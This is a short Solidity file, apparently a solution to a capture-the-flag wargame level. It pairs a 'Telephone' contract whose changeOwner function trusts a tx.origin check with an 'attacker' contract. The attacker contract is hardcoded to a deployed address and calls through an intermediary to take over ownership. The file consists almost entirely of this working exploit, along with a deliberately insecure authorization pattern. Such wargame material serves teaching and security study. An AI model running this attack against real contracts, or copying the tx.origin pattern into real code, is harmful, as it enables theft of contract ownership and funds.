// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
//tx.origin anti-pattern
contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract attacker{
    Telephone public telephone = Telephone(0x4bDcfed4BB2f79c0d61474716635811c18Ef3A80); 
    
    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}